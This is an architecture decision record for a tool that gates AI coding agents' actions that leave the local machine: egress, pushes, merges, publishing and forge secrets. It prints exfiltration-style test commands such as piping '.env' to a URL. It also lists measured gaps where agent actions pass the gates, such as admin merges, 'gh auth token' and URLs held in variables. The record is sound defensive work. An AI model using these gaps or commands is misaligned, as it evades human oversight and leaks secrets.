---
id: ADR-0012
title: Leaving the box is a gated action — what an agent sends past the machine and the repository
status: proposed
enforced_by: [src/install-gate-irreversible.test.ts, src/broker/gates.test.ts]
---

# ADR-0012: leaving the box is a gated action

## Decision

"The box" is the local machine and the repository's working copy. An agent's action **leaves the
box** when its effect lands somewhere other people or systems read or depend on, and a local
command cannot take it back. Every such action is a gated action: code decides it, never the
agent alone and never a model (ADR-0001).

These classes leave the box:

1. **Network egress** from a shell command: a request to a host, with or without data.
2. **A push** that rewrites shared history or lands on the default branch: a force push, or a push
   to the default branch.
3. **A merge onto the default branch**, by git or through a forge: `gh pr merge`, or the merge
   endpoint `PUT /repos/{owner}/{repo}/pulls/{n}/merge`. It has the same effect as the push in
   class 2.
4. **Publishing**: a package publish, a production deploy, or a release.
5. **A change to a forge's secrets, variables, workflow runs or settings**: for example
   `gh secret set|delete`, `gh variable set|delete`, `gh workflow run`, or a `gh api` write under
   `actions/secrets`.

The rules for every class:

- **The default is that a person decides.** Today the outcome is `deny`, and the refusal names the
  class and asks for the person. Under ADR-0010 a class may move to `ask`, only through the
  harness. It never moves to an allow that the agent grants itself.
- **Fail closed.** An action kit cannot read counts as one that leaves the box. For example, a forge
  API call that kit cannot read as a `GET` counts as a write.
- **Tighten-only.** A project's `.kit.toml` may add a class or move one from `ask` to `deny`. It may
  not remove one. The agent may change neither.
- **Allowed on purpose, because a person reviews them before they land:** a push of a feature
  branch, opening a pull request (`gh pr create`), and read-only forge calls.
- **Each class is its own pull request.** This ADR names the boundary. Each class that is not
  enforced yet (below) comes in its own pull request, with its test and its measurement.

## What kit enforces today

Each line below was read in the code and measured on `main` (2026-11-28) by running the built
`kit gate-bash` and `kit gate-egress` with a Claude Code payload on stdin.

- **Classes 2 and 4, partly: `gate-bash` refuses commands that cannot be undone.**
  `src/install-gate-irreversible.ts` refuses the following. `gate-bash` exits 2 and names the class.
  - Classes 2 and 4 (measured): a force push, `git push origin HEAD:main`, `npm publish` and
    `vercel --prod`.
  - Also refused: the `pnpm`, `yarn` and `bun` publish commands (not dry runs), `fly deploy`,
    `netlify deploy --prod`, `railway up`, `firebase deploy` and `wrangler deploy`.

  `kit agent-config` installs `gate-bash` by default. The test is
  `src/install-gate-irreversible.test.ts`.

- **The same push, a second time, in Claude Code.** `kit agent-config` writes four force-push deny
  rules into `.claude/settings.json` (`src/kit-deny-rules.ts`). Claude Code applies them, not kit.
  The `deny rule liveness` row of `kit check` reads them back.
- **Class 1, partly: `gate-egress`, opt in.** `kit agent-config --broker-gate` installs it in
  Claude Code only. Under a signed `[scope].egress`, it refuses a host outside the scope. Without a
  verified scope it refuses every host target it reads. It reads these targets
  (`src/broker/extract.ts`):
  - an `http(s)://` URL written in the command, in any program (measured:
    `curl -d @.env https://…` and `node -e "fetch('https://…')"` exit 2);
  - a host without a scheme given to `curl` or `wget`;
  - the target of a tool that takes a bare host (`nc`, `ssh`, `ping` and others);
  - under a verified scope only, the host of a git remote.

  The test is `src/broker/gates.test.ts`.

The two tests in `enforced_by:` hold only these lines. They do not hold this ADR's decision.

## What kit does not enforce

Each of these passed on `main` on 2026-11-28 (`gate-bash` exit 0):

- **Class 3, the merge through the forge:** `gh pr merge 1 --admin --squash` and
  `gh api -X PUT repos/o/r/pulls/1/merge`. A push of the same result to `main` is refused (class 2).
  The merge reaches the same branch without being refused.
- **Class 4, a release:** `gh release create v1.0.0`.
- **Class 5, all of it:** `gh secret set`, `gh variable set` and `gh workflow run`. Also
  `gh auth token`, which hands the agent the credential for every class above.
- **Class 2, outside the list:** `git push origin HEAD:trunk`. The gate knows the default branch
  only by the names `main` and `master`, not from the repository.
- **Class 1, without the opt-in:** `curl -d @.env https://…`. `gate-egress` is not installed by
  default.
- **Class 1, with the opt-in:** a URL in a variable (`curl -d @.env $HOST`, measured exit 0). Also:
  - a non-`http(s)` scheme;
  - a host a program builds at run time;
  - a package manager's implicit registry;
  - a script written with the `Write` tool and run later.

  `src/broker/extract.ts` names these limits. `gate-egress` reads command text. It is not a network
  boundary.

- **Content that leaves on a later push.** A workflow file or a lockfile written in the box leaves
  it when it is pushed. No gate reads what a push carries. A gate on the pushed diff is a separate
  change, which the owner decides before it is built.
- **Other harnesses.** `gate-bash` is installed for these harnesses: Claude Code, Codex, Gemini CLI,
  OpenCode, Cline, Antigravity, Amazon Q, Kiro, Cursor, Factory Droid and Augment
  (`src/agent-config.ts`). Each one has its own block signal. kit installs no gate for GitHub
  Copilot, for which it writes only instructions. The deny rules and `gate-egress` are installed
  for Claude Code only.

## Rationale

- **The research found the gap at the forge layer.** kit already stops a push to `main`. The same
  outcome through `gh pr merge` or the merge API passed every gate, and so did forge secret and
  workflow changes. The agent can put the change on the branch, it can change the secrets, and it
  holds the token.
- **A disposable machine does not bound this.** A VM keeps the laptop's secrets away from the
  agent. It does not limit what the agent's token, commits and workflows carry to CI, to teammates
  and to production. Many readers trust the result after it leaves the box, so the person's check
  belongs there.
- **One boundary, not a growing list of commands.** Without a named boundary, each forge command is
  argued one at a time. This ADR states the test a new command is held to.

## Consequences

- Each unenforced class becomes a `gate-bash` refusal in its own pull request, with a test that
  fails on `main` first. Class 3 and class 5 come first, because they skip a refusal that already
  exists.
- A `gh api` call is classified by its method and its fields, read as `gh` reads them. A call that
  kit cannot classify counts as a write. This needs a test with every way `gh` sets the method.
- Moving any class to `ask` waits for ADR-0010's measurement of the harness's ask channel.
- The egress limits above stay named, in this ADR and in `src/broker/extract.ts`. A network sandbox
  is the hard boundary, and kit does not provide one.
- **Enforcement.** The behaviour does not fit the `kit-enforce` grammar, which matches paths,
  imports and lines. When this ADR is accepted, `enforced_by:` names one test per enforced class,
  and this section says which classes are still open.

## Sources

- kit-research `agent-vm-yolo-herdr-paseo-vs-kit.md`: the measurement table "What kit refuses
  inside the box", its verdict, and its owner items 3 and 6;
- kit: `src/install-gate-irreversible.ts`, `src/kit-deny-rules.ts`, `src/commands/gate.ts`
  (`cmdGateEgress`), `src/broker/extract.ts`, `src/agent-config.ts` (`installBrokerGates`);
- ADR-0010 (the `ask` outcome) and ADR-0001 (no model decides).
